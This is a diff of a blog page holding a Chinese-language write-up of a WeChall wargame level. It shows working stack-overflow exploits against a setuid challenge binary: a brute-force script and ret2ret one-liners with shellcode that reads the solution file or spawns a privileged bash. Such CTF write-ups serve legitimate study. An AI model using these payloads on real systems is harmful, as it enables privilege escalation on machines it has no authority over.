@@ -1,18 +1,19 @@
-<!DOCTYPE html>
-<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]--><!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]--><!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]--><!--[if gt IE 8]><!--><html class="no-js" lang="en">
-<!--<![endif]-->
+<!doctype html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
+<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
 <head>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <meta charset="utf-8">
 <meta name="theme-color" content="#000000">
-<title>Writeup-Training: Warchall – 7 Tropical Fruits – /home/cubarco</title>
-<meta name="description" content="Challenge URL：Training: Warchall – 7 Tropical Fruits Wechall的tropic这道题真是撸得我考试周复(yu)习(xi)都没心思了，花了两天半终于搞定了，才63人做出来的题目居然是training！！！ 做这题的时候也是我第一次写shellcode，不过这道题难点不在于shellcode怎么写，而在于坑爹的ASLR。不说stack的地址一直在变，居然连linux-gate.so都在变！ 一开始查了好久，发现个思路叫ret2libc，然后我gdb了一下，发现system()的地址虽然是随机的，但是有6位是不变的。然后我就撸啊撸，撸了个shell脚本，速度不错，居然半分钟之内就能把system(“sh”)跑出来。看到”sh-4.2$”的时候我那叫一个激动啊。坑爹的是system()这货执行的时候居然会丢掉suid的权限(man system#NOTES)。 所以忙活了一天，我的成果就是，在一个shell下面，再开一个shell…… 然后第二天我不甘心啊，就找啊找找啊找，找到了exec函数族。 #include &lt;unistd.h&gt; extern char **environ; int execl(const char *path, const char *arg, ...); int execlp(const char *file, const char *arg, ...); int execle(const char *path, const char *arg, ..., char * const envp[]); int execv(const char *path, char *const argv[]); int execvp(const char *file, char *const argv[]); int execve(const char *path, char *const argv[], char *const envp[]); //其中只有execve是真正意义上的系统调用，其它都是在此基础上经过包装的库函数。 这货厉害，suid会传递下去，但是悲催的是每个函数的参数不止一个，而且大多都要求最后一个参数为NULL(直接无视)，但是execv之类的函数又不方便构造后面的那些二阶指针，所以我昨天就是在满屏的Segmentation Fault中度过的，偶尔出现的Invalid Instruction能让人高兴好一阵。 第二天无果，不过我cat了一下compile7.sh，发现了好玩的东西 #!/bin/bash...">
+<title>Writeup-Training: Warchall &#8211; 7 Tropical Fruits &#8211; /home/cubarco</title>
+<meta name="description" content="Challenge URL：Training: Warchall &#8211; 7 Tropical Fruits Wechall的tropic这道题真是撸得我考试周复(yu)习(xi)都没心思了，花了两天半终于搞定了，才63人做出来的题目居然是training！！！ 做这题的时候也是我第一次写shellcode，不过这道题难点不在于shellcode怎么写，而在于坑爹的ASLR。不说stack的地址一直在变，居然连linux-gate.so都在变！ 一开始查了好久，发现个思路叫ret2libc，然后我gdb了一下，发现system()的地址虽然是随机的，但是有6位是不变的。然后我就撸啊撸，撸了个shell脚本，速度不错，居然半分钟之内就能把system(“sh”)跑出来。看到”sh-4.2$”的时候我那叫一个激动啊。坑爹的是system()这货执行的时候居然会丢掉suid的权限(man system#NOTES)。 所以忙活了一天，我的成果就是，在一个shell下面，再开一个shell…… 然后第二天我不甘心啊，就找啊找找啊找，找到了exec函数族。 #include &lt;unistd.h&gt; extern char **environ; int execl(const char *path, const char *arg, ...); int execlp(const char *file, const char *arg, ...); int execle(const char *path, const char *arg, ..., char * const envp[]); int execv(const char *path, char *const argv[]); int execvp(const char *file, char *const argv[]); int execve(const char *path, char *const argv[], char *const envp[]); //其中只有execve是真正意义上的系统调用，其它都是在此基础上经过包装的库函数。 这货厉害，suid会传递下去，但是悲催的是每个函数的参数不止一个，而且大多都要求最后一个参数为NULL(直接无视)，但是execv之类的函数又不方便构造后面的那些二阶指针，所以我昨天就是在满屏的Segmentation Fault中度过的，偶尔出现的Invalid Instruction能让人高兴好一阵。 第二天无果，不过我cat了一下compile7.sh，发现了好玩的东西 #!/bin/bash...">
 <meta name="keywords" content="Hack, Python, Writeup">
 
 
 <!-- Twitter Cards -->
-<meta name="twitter:title" content="Writeup-Training: Warchall – 7 Tropical Fruits">
-<meta name="twitter:description" content="Challenge URL：Training: Warchall – 7 Tropical Fruits Wechall的tropic这道题真是撸得我考试周复(yu)习(xi)都没心思了，花了两天半终于搞定了，才63人做出来的题目居然是training！！！ 做这题的时候也是我第一次写shellcode，不过这道题难点不在于shellcode怎么写，而在于坑爹的ASLR。不说stack的地址一直在变，居然连linux-gate.so都在变！ 一开始查了好久，发现个思路叫ret2libc，然后我gdb了一下，发现system()的地址虽然是随机的，但是有6位是不变的。然后我就撸啊撸，撸了个shell脚本，速度不错，居然半分钟之内就能把system(“sh”)跑出来。看到”sh-4.2$”的时候我那叫一个激动啊。坑爹的是system()这货执行的时候居然会丢掉suid的权限(man system#NOTES)。 所以忙活了一天，我的成果就是，在一个shell下面，再开一个shell…… 然后第二天我不甘心啊，就找啊找找啊找，找到了exec函数族。 #include &lt;unistd.h&gt; extern char **environ; int execl(const char *path, const char *arg, ...); int execlp(const char *file, const char *arg, ...); int execle(const char *path, const char *arg, ..., char * const envp[]); int execv(const char *path, char *const argv[]); int execvp(const char *file, char *const argv[]); int execve(const char *path, char *const argv[], char *const envp[]); //其中只有execve是真正意义上的系统调用，其它都是在此基础上经过包装的库函数。 这货厉害，suid会传递下去，但是悲催的是每个函数的参数不止一个，而且大多都要求最后一个参数为NULL(直接无视)，但是execv之类的函数又不方便构造后面的那些二阶指针，所以我昨天就是在满屏的Segmentation Fault中度过的，偶尔出现的Invalid Instruction能让人高兴好一阵。 第二天无果，不过我cat了一下compile7.sh，发现了好玩的东西 #!/bin/bash...">
+<meta name="twitter:title" content="Writeup-Training: Warchall &#8211; 7 Tropical Fruits">
+<meta name="twitter:description" content="Challenge URL：Training: Warchall &#8211; 7 Tropical Fruits Wechall的tropic这道题真是撸得我考试周复(yu)习(xi)都没心思了，花了两天半终于搞定了，才63人做出来的题目居然是training！！！ 做这题的时候也是我第一次写shellcode，不过这道题难点不在于shellcode怎么写，而在于坑爹的ASLR。不说stack的地址一直在变，居然连linux-gate.so都在变！ 一开始查了好久，发现个思路叫ret2libc，然后我gdb了一下，发现system()的地址虽然是随机的，但是有6位是不变的。然后我就撸啊撸，撸了个shell脚本，速度不错，居然半分钟之内就能把system(“sh”)跑出来。看到”sh-4.2$”的时候我那叫一个激动啊。坑爹的是system()这货执行的时候居然会丢掉suid的权限(man system#NOTES)。 所以忙活了一天，我的成果就是，在一个shell下面，再开一个shell…… 然后第二天我不甘心啊，就找啊找找啊找，找到了exec函数族。 #include &lt;unistd.h&gt; extern char **environ; int execl(const char *path, const char *arg, ...); int execlp(const char *file, const char *arg, ...); int execle(const char *path, const char *arg, ..., char * const envp[]); int execv(const char *path, char *const argv[]); int execvp(const char *file, char *const argv[]); int execve(const char *path, char *const argv[], char *const envp[]); //其中只有execve是真正意义上的系统调用，其它都是在此基础上经过包装的库函数。 这货厉害，suid会传递下去，但是悲催的是每个函数的参数不止一个，而且大多都要求最后一个参数为NULL(直接无视)，但是execv之类的函数又不方便构造后面的那些二阶指针，所以我昨天就是在满屏的Segmentation Fault中度过的，偶尔出现的Invalid Instruction能让人高兴好一阵。 第二天无果，不过我cat了一下compile7.sh，发现了好玩的东西 #!/bin/bash...">
 <meta name="twitter:site" content="@Cube_Lin">
 <meta name="twitter:creator" content="@Cube_Lin">
 
@@ -24,8 +25,8 @@
 <!-- Open Graph -->
 <meta property="og:locale" content="zh_CN">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Writeup-Training: Warchall – 7 Tropical Fruits">
-<meta property="og:description" content="Challenge URL：Training: Warchall – 7 Tropical Fruits Wechall的tropic这道题真是撸得我考试周复(yu)习(xi)都没心思了，花了两天半终于搞定了，才63人做出来的题目居然是training！！！ 做这题的时候也是我第一次写shellcode，不过这道题难点不在于shellcode怎么写，而在于坑爹的ASLR。不说stack的地址一直在变，居然连linux-gate.so都在变！ 一开始查了好久，发现个思路叫ret2libc，然后我gdb了一下，发现system()的地址虽然是随机的，但是有6位是不变的。然后我就撸啊撸，撸了个shell脚本，速度不错，居然半分钟之内就能把system(“sh”)跑出来。看到”sh-4.2$”的时候我那叫一个激动啊。坑爹的是system()这货执行的时候居然会丢掉suid的权限(man system#NOTES)。 所以忙活了一天，我的成果就是，在一个shell下面，再开一个shell…… 然后第二天我不甘心啊，就找啊找找啊找，找到了exec函数族。 #include &lt;unistd.h&gt; extern char **environ; int execl(const char *path, const char *arg, ...); int execlp(const char *file, const char *arg, ...); int execle(const char *path, const char *arg, ..., char * const envp[]); int execv(const char *path, char *const argv[]); int execvp(const char *file, char *const argv[]); int execve(const char *path, char *const argv[], char *const envp[]); //其中只有execve是真正意义上的系统调用，其它都是在此基础上经过包装的库函数。 这货厉害，suid会传递下去，但是悲催的是每个函数的参数不止一个，而且大多都要求最后一个参数为NULL(直接无视)，但是execv之类的函数又不方便构造后面的那些二阶指针，所以我昨天就是在满屏的Segmentation Fault中度过的，偶尔出现的Invalid Instruction能让人高兴好一阵。 第二天无果，不过我cat了一下compile7.sh，发现了好玩的东西 #!/bin/bash...">
+<meta property="og:title" content="Writeup-Training: Warchall &#8211; 7 Tropical Fruits">
+<meta property="og:description" content="Challenge URL：Training: Warchall &#8211; 7 Tropical Fruits Wechall的tropic这道题真是撸得我考试周复(yu)习(xi)都没心思了，花了两天半终于搞定了，才63人做出来的题目居然是training！！！ 做这题的时候也是我第一次写shellcode，不过这道题难点不在于shellcode怎么写，而在于坑爹的ASLR。不说stack的地址一直在变，居然连linux-gate.so都在变！ 一开始查了好久，发现个思路叫ret2libc，然后我gdb了一下，发现system()的地址虽然是随机的，但是有6位是不变的。然后我就撸啊撸，撸了个shell脚本，速度不错，居然半分钟之内就能把system(“sh”)跑出来。看到”sh-4.2$”的时候我那叫一个激动啊。坑爹的是system()这货执行的时候居然会丢掉suid的权限(man system#NOTES)。 所以忙活了一天，我的成果就是，在一个shell下面，再开一个shell…… 然后第二天我不甘心啊，就找啊找找啊找，找到了exec函数族。 #include &lt;unistd.h&gt; extern char **environ; int execl(const char *path, const char *arg, ...); int execlp(const char *file, const char *arg, ...); int execle(const char *path, const char *arg, ..., char * const envp[]); int execv(const char *path, char *const argv[]); int execvp(const char *file, char *const argv[]); int execve(const char *path, char *const argv[], char *const envp[]); //其中只有execve是真正意义上的系统调用，其它都是在此基础上经过包装的库函数。 这货厉害，suid会传递下去，但是悲催的是每个函数的参数不止一个，而且大多都要求最后一个参数为NULL(直接无视)，但是execv之类的函数又不方便构造后面的那些二阶指针，所以我昨天就是在满屏的Segmentation Fault中度过的，偶尔出现的Invalid Instruction能让人高兴好一阵。 第二天无果，不过我cat了一下compile7.sh，发现了好玩的东西 #!/bin/bash...">
 <meta property="og:url" content="https://cub4r.co/blog/2014/05/wechall-tropic-writeup/">
 <meta property="og:site_name" content="/home/cubarco">
 
@@ -36,7 +37,7 @@
 
 <link rel="canonical" href="https://cub4r.co/blog/2014/05/wechall-tropic-writeup/">
 <link href="https://cub4r.co/feed.xml" type="application/atom+xml" rel="alternate" title="/home/cubarco Feed">
-<link rel="author" href="http://plus.google.com/+%E6%9E%97%E5%AE%B6%E5%86%9BCube?rel=author">
+
 
 <!-- http://t.co/dKP3o1e -->
 <meta name="HandheldFriendly" content="True">
@@ -48,7 +49,7 @@
 <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.2.0/css/font-awesome.min.css">
 
 <!--Webfonts-->
-<link href="//fonts.googleapis.com/css?family=Volkhov%7CCabin" rel="stylesheet" type="text/css">
+<link href='//fonts.googleapis.com/css?family=Volkhov|Cabin' rel='stylesheet' type='text/css'>
 <!--
    -[> Webfonts <]
    -<script src="//use.edgefonts.net/source-sans-pro:n2,i2,n3,i3,n4,i4,n6,i6,n7,i7,n9,i9;source-code-pro:n4,n7;volkhov;cabin.js"></script>
@@ -105,25 +106,24 @@
 	    <ul>
       
 		    
-		    <li><a href="https://cub4r.co/blog/">Latest</a></li>
+		    <li><a href="https://cub4r.co/blog/" >Latest</a></li>
 		  
 		    
-		    <li><a href="https://cub4r.co/blog/about/">About</a></li>
+		    <li><a href="https://cub4r.co/blog/about/" >About</a></li>
 		  
 		    
-		    <li><a href="https://cub4r.co/blog/category/blog/">Blog</a></li>
+		    <li><a href="https://cub4r.co/blog/category/blog/" >Blog</a></li>
 		  
 		    
-		    <li><a href="https://cub4r.co/blog/category/notes/">Notes</a></li>
+		    <li><a href="https://cub4r.co/blog/category/notes/" >Notes</a></li>
 		  
 		    
-		    <li><a href="https://cub4r.co/blog/tags/">Tags</a></li>
+		    <li><a href="https://cub4r.co/blog/tags/" >Tags</a></li>
 		  
         <li class="dosearch"><span><i class="fa fa-search"></i> Search</span></li>
 	    </ul>
 	</nav>
-</div>
-<!-- /.navigation-wrapper -->
+</div><!-- /.navigation-wrapper -->
 
 <!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
 
@@ -131,12 +131,9 @@
   <div class="search-form">
     <input type="text" class="search-field" placeholder="Search...">
     <button class="close-btn"><i class="fa fa-times-circle fa-2x"></i></button>
-    <ul class="search-results post-list"></ul>
-<!-- /.search-results -->
-  </div>
-<!-- /.search-form -->
-</div>
-<!-- ./search-wrapper -->
+    <ul class="search-results post-list"></ul><!-- /.search-results -->
+  </div><!-- /.search-form -->
+</div><!-- ./search-wrapper -->
 
 <div class="js-menu-screen menu-screen"></div>
 
@@ -146,15 +143,15 @@
     
     <div class="entry-wrapper">
       <header class="entry-header">
-        <span class="entry-tags"><a href="https://cub4r.co/blog/tags/#Hack" title="Pages tagged Hack">Hack</a> • <a href="https://cub4r.co/blog/tags/#Python" title="Pages tagged Python">Python</a> • <a href="https://cub4r.co/blog/tags/#Writeup" title="Pages tagged Writeup">Writeup</a></span>
+        <span class="entry-tags"><a href="https://cub4r.co/blog/tags/#Hack" title="Pages tagged Hack">Hack</a>&nbsp;&bull;&nbsp;<a href="https://cub4r.co/blog/tags/#Python" title="Pages tagged Python">Python</a>&nbsp;&bull;&nbsp;<a href="https://cub4r.co/blog/tags/#Writeup" title="Pages tagged Writeup">Writeup</a></span>
         
-          <h1 class="entry-title">Writeup-Training: Warchall – 7 Tropical Fruits</h1>
+          <h1 class="entry-title">Writeup-Training: Warchall &#8211; 7 Tropical Fruits</h1>
         
       </header>
       <footer class="entry-meta">
         
         
-          <img src="https://cub4r.co/images/matrix.png" class="bio-photo" alt="Cubarco bio photo">
+          <img src="https://cub4r.co/images/matrix.png" class="bio-photo" alt="Cubarco bio photo"></a>
         
         <span class="author vcard">By <span class="fn">Cubarco</span></span>
         <span class="entry-date date published"><time datetime="2014-05-14T00:00:00+00:00"><i class="fa fa-calendar-o"></i> May 14, 2014</time></span>
@@ -174,7 +171,7 @@
       </footer>
       <div class="entry-content">
         <p style="color: #000000;">
-  Challenge URL：<a style="color: #294666;" href="http://www.wechall.net/challenge/warchall/tropical/7/index.php">Training: Warchall – 7 Tropical Fruits</a>
+  Challenge URL：<a style="color: #294666;" href="http://www.wechall.net/challenge/warchall/tropical/7/index.php">Training: Warchall &#8211; 7 Tropical Fruits</a>
 </p>
 
 <p>Wechall的tropic这道题真是撸得我考试周复(yu)习(xi)都没心思了，花了两天半终于搞定了，才63人做出来的题目居然是training！！！</p>
@@ -195,30 +192,30 @@
 <span class="kt">int</span> <span class="n">execv</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">argv</span><span class="p">[]);</span>
 <span class="kt">int</span> <span class="n">execvp</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">argv</span><span class="p">[]);</span>
 <span class="kt">int</span> <span class="n">execve</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envp</span><span class="p">[]);</span>
-<span class="o">//</span><span class="err">其中只有</span><span class="n">execve</span><span class="err">是真正意义上的系统调用，其它都是在此基础上经过包装的库函数。</span></code></pre></figure>
+<span class="c1">//其中只有execve是真正意义上的系统调用，其它都是在此基础上经过包装的库函数。</span></code></pre></figure>
 
 <p>这货厉害，suid会传递下去，但是悲催的是每个函数的参数不止一个，而且大多都要求最后一个参数为NULL(直接无视)，但是execv之类的函数又不方便构造后面的那些二阶指针，所以我昨天就是在满屏的Segmentation Fault中度过的，偶尔出现的Invalid Instruction能让人高兴好一阵。</p>
 
 <p>第二天无果，不过我cat了一下compile7.sh，发现了好玩的东西</p>
 
 <figure class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="c">#!/bin/bash</span>
-gcc -fno-stack-protector -z execstack level7.c -o level7
-chmod 6755 level7</code></pre></figure>
+gcc <span class="nt">-fno-stack-protector</span> <span class="nt">-z</span> execstack level7.c <span class="nt">-o</span> level7
+<span class="nb">chmod </span>6755 level7</code></pre></figure>
 
 <p>是的…出题者把DEP关掉了…然后我就睡不着了</p>
 
-<h2 id="section">解法：</h2>
+<h2 id="解法">解法：</h2>
 
 <p>今天早上考完离散就立马赶回寝室继续撸这道题，虽然解法很很蠢(对stack的5个随机位进行碰撞)，但是至少能在10分钟内出结果……</p>
 
 <p>先给solution.txt建一个到工作目录软连接:</p>
 
-<figure class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="gp">$ </span>ln -s /home/level/tropic/7/solution.txt ./lk</code></pre></figure>
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span><span class="nb">ln</span> <span class="nt">-s</span> /home/level/tropic/7/solution.txt ./lk</code></pre></figure>
 
 <p>然后跑这个python脚本：</p>
 
-<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c"># -*- coding=utf8 -*-</span>
-<span class="n">__author__</span> <span class="o">=</span> <span class="s">'Cubarco'</span>
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># -*- coding=utf8 -*-
+</span><span class="n">__author__</span> <span class="o">=</span> <span class="s">'Cubarco'</span>
 
 
 <span class="k">def</span> <span class="nf">tropic_crack</span><span class="p">():</span>
@@ -245,9 +242,9 @@ chmod 6755 level7</code></pre></figure>
         <span class="k">if</span> <span class="n">rsp</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
             <span class="k">print</span> <span class="n">rsp</span>
     <span class="k">except</span><span class="p">:</span>
-        <span class="c"># print traceback.format_exc()</span>
-        <span class="c"># 好像subprocess开太快了会出问题...</span>
-        <span class="k">pass</span>
+        <span class="c1"># print traceback.format_exc()
+</span>        <span class="c1"># 好像subprocess开太快了会出问题...
+</span>        <span class="k">pass</span>
 
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
@@ -265,31 +262,28 @@ chmod 6755 level7</code></pre></figure>
 
 <p>UPDATE: 刚看了一下ret2ret，我想去死一死了。是的，只用下面一句话就能搞定，oh，前提还是给solution.txt建立一个到工作目录的软链接，名字是lk（其实是因为./lk刚好是四字节， 如果用原来的路径好麻烦还要四字节对齐，偷个懒）</p>
 
-<figure class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="gp">$ </span>/home/level/tropic/7/level7 <span class="sb">`</span>python -c <span class="s2">"print '</span><span class="se">\x</span><span class="s2">90'*(312-33)+'1</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">99Rh/cath/bin</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3Rh./lk</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0bRQS</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80'+'</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08'"</span><span class="sb">`</span>
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span>/home/level/tropic/7/level7 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">90'*(312-33)+'1</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">99Rh/cath/bin</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3Rh./lk</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0bRQS</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80'+'</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08'"</span><span class="sb">`</span>
 <span class="c"># 0x080484d2是程序里面一个执行ret指令的地址，随便挑！</span></code></pre></figure>
 
 <p>更BT一点还可以这样，跑一个/bin/bash -p：</p>
 
-<figure class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="gp">$ </span>/home/level/tropic/7/level7 <span class="sb">`</span>python -c <span class="s2">"print '</span><span class="se">\x</span><span class="s2">90'*(312-33)+'j</span><span class="se">\x</span><span class="s2">0bX</span><span class="se">\x</span><span class="s2">99Rfh-p</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1Rjhh/bash/bin</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3RQS</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80'+'</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08'"</span><span class="sb">`</span>
-<span class="gp">bash-4.2$ </span>id
-<span class="nv">uid</span><span class="o">=</span>4057<span class="o">(</span>cubarco<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>4057<span class="o">(</span>cubarco<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>1008<span class="o">(</span>level7<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>4057<span class="o">(</span>cubarco<span class="o">)</span>
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span>/home/level/tropic/7/level7 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">90'*(312-33)+'j</span><span class="se">\x</span><span class="s2">0bX</span><span class="se">\x</span><span class="s2">99Rfh-p</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1Rjhh/bash/bin</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3RQS</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80'+'</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08'"</span><span class="sb">`</span>
+bash-4.2<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>4057<span class="o">(</span>cubarco<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>4057<span class="o">(</span>cubarco<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>1008<span class="o">(</span>level7<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>4057<span class="o">(</span>cubarco<span class="o">)</span>
 <span class="c"># 然后你就有level7的egid了...</span></code></pre></figure>
 
-<h2 id="section-1"> 参考：</h2>
+<h2 id="参考"> 参考：</h2>
 
 <ol>
   <li>Hackers Hut#<a href="http://www.win.tue.nl/~aeb/linux/hh/hh-10.html">Smashing The Stack</a>(ASLR bypassing overview)</li>
-  <li>
-<a href="http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf">Performing a ret2libc Attack</a>(ret2libc)</li>
-  <li>
-<a href="http://www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Return_to_libc/Return_to_libc.pdf">Return-to-libc Attack Lab</a>(ret2libc)</li>
-  <li>
-<a href="http://web.textfiles.com/hacking/smackthestack.txt">Smack the Stack</a>(ret2ret)</li>
+  <li><a href="http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf">Performing a ret2libc Attack</a>(ret2libc)</li>
+  <li><a href="http://www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Return_to_libc/Return_to_libc.pdf">Return-to-libc Attack Lab</a>(ret2libc)</li>
+  <li><a href="http://web.textfiles.com/hacking/smackthestack.txt">Smack the Stack</a>(ret2ret)</li>
 </ol>
 
 
         <div align="right">
-		    <span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc/4.0/88x31.png"></a></span>
+		    <span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc/4.0/88x31.png" /></a></span>
         </div>
         <nav class="pagination" role="navigation">
             
@@ -299,39 +293,33 @@ chmod 6755 level7</code></pre></figure>
               <a href="https://cub4r.co/blog/2014/12/hello-world/" class="btn" title="Hello World">Next</a>
             
         </nav><!-- /.pagination -->
-        <div id="disqus_thread"></div>
-<!-- /#disqus_thread -->
-      </div>
-<!-- /.entry-content -->
-    </div>
-<!-- /.entry-wrapper -->
+        <div id="disqus_thread"></div><!-- /#disqus_thread -->
+      </div><!-- /.entry-content -->
+    </div><!-- /.entry-wrapper -->
 
   </article>
-</div>
-<!-- /#main -->
+</div><!-- /#main -->
 
 <div class="footer-wrapper">
   <footer role="contentinfo" class="entry-wrapper">
     
 
-<span>Powered by <a href="http://jekyllrb.com" rel="nofollow">Jekyll</a> using the <a href="https://mademistakes.com/work/so-simple-jekyll-theme/" rel="nofollow">So Simple Theme</a>. Published with <a href="https://github.com/cubarco/cubarco.github.io">GitHub Pages</a>.</span>
+<span>Powered by <a href="http://jekyllrb.com" rel="nofollow">Jekyll</a> using the <a href="https://mademistakes.com/work/so-simple-jekyll-theme/" rel="nofollow">So Simple Theme</a>. Published with <a href="https://now.sh/">Now</a>.</span>
 <div class="social-icons">
 	<a href="https://twitter.com/Cube_Lin" title="Cubarco on Twitter" target="_blank"><i class="fa fa-twitter-square fa-2x"></i></a>
-	<a href="https://www.facebook.com/cubarco" title="Cubarco on Facebook" target="_blank"><i class="fa fa-facebook-square fa-2x"></i></a>
-	<a href="https://plus.google.com/+%E6%9E%97%E5%AE%B6%E5%86%9BCube" title="Cubarco on Google+" target="_blank"><i class="fa fa-google-plus-square fa-2x"></i></a>
 	
 	
-	<a href="https://www.instagram.com/cubarco/" title="Cubarco on Instagram" target="_blank"><i class="fa fa-instagram fa-2x"></i></a>
+	
+	
+	
 	
 	<a href="https://github.com/cubarco" title="Cubarco on Github" target="_blank"><i class="fa fa-github-square fa-2x"></i></a>
 	
   <a href="https://cub4r.co/feed.xml" title="Atom/RSS feed"><i class="fa fa-rss-square fa-2x"></i></a>
-</div>
-<!-- /.social-icons -->
+</div><!-- /.social-icons -->
 
   </footer>
-</div>
-<!-- /.footer-wrapper -->
+</div><!-- /.footer-wrapper -->
 
 <script src="//cdn.bootcss.com/jquery/2.1.4/jquery.min.js"></script>
 <script>window.jQuery || document.write('<script src="https://cub4r.co/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
@@ -399,8 +387,7 @@ chmod 6755 level7</code></pre></figure>
         (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
     }());
 </script>
-<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a>
-</noscript>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
 <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
 
 
